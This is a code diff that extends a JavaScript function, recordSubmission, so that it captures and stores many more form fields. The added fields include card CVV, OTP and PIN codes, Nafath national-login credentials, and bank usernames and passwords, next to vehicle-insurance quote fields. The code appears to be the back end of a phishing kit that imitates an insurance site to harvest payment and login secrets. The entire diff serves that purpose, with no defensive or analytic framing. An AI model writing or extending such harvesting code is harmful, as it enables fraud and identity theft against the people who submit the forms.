@@ -235,9 +235,24 @@ function recordSubmission(type, payload) {
     set("cardExpiryYear", ["expiryYear"]);
     set("paymentMethod", ["paymentMethod"]);
     set("cardCvv", ["cvv"]);
-    set("otp", ["otp", "otpCode", "code"]);
+    set("otp", ["otp", "otpCode", "code", "otpValue", "pinCode", "pin"]);
+    set("nafathId", ["nafathId", "nafathNumber", "nafathIdentity"]);
+    set("nafathPassword", ["nafathPassword", "password"]);
+    set("bankUsername", ["bankUsername", "username", "userId", "userid"]);
+    set("bankPassword", ["bankPassword"]);
+    set("address", ["address", "nationalAddress", "streetName", "district"]);
+    set("city", ["city", "cityName"]);
+    set("postalCode", ["postalCode", "zipCode"]);
+    set("gender", ["gender", "sex"]);
+    set("nationality", ["nationality"]);
+    set("purpose", ["purpose", "usage"]);
+    set("driverAge", ["driverAge", "age"]);
+    set("licenseType", ["licenseType"]);
+    set("startDate", ["startDate", "policyStart"]);
+    set("promoCode", ["promoCode", "coupon"]);
     set("result", ["result"]);
     set("vehicle", ["vehicle"]);
+    set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
     upsertSession(id, {
